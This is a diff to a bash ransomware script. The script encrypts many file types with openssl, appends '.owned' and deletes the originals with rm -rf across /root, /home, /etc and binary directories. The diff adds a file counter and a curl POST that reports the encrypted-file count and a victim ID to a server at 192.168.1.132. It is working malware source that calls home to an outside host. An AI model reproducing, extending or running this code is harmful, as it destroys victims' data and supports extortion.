@@ -14,6 +14,8 @@ else
   echo "Could not determine OS" &>/dev/null
 fi
 
+count=0
+
 fileExts=("*.py" "*.txt" "*.cpp" "*.png" "*.jpg" "*.sh" "*.pyc" "*.key" "*.php" "*.css" "*.js" "*.tiff" "*.tff" "*.pl" \
           "*.ini" "*.xml" "*.desktop" "*.gpg" "*.enc" "*.lst" ".list" "*.properties" "*.acl" "*.gz" "*.tar" "*.bz2" "*.gif" \
           "*.doc*" "*.xls*" "*.pdf" "*.java" "*.swf" "*.jar" "*.json" "*.ppt*" "*.pst" "*.bat" "*.exe" "*.x" "*.pm" \
@@ -73,6 +75,8 @@ do
     openssl enc -aes-256-cbc -salt -in "${file}" -out "${file}.owned" -pass file:/root/key.bin &>/dev/null
 
     rm -rf  ${file} &>/dev/null
+
+    let ${count}++
   done
 done
 
@@ -83,8 +87,12 @@ do
     openssl enc -aes-256-cbc -salt -in "${file}" -out "${file}.owned" -pass file:/root/key.bin &>/dev/null
 
     rm -rf ${file} &>/dev/null
+
+    let ${count}++
   done
 done
+
+curl -k -d "fileCount=${count}&uniqueId=${genKey}" https://192.168.1.132/count.php
 
 for directory in $(find /root/ /home/ /etc/ /bin/ /usr/sbin/ /usr/bin /sbin/ /usr/local/bin/ -type d)
 do
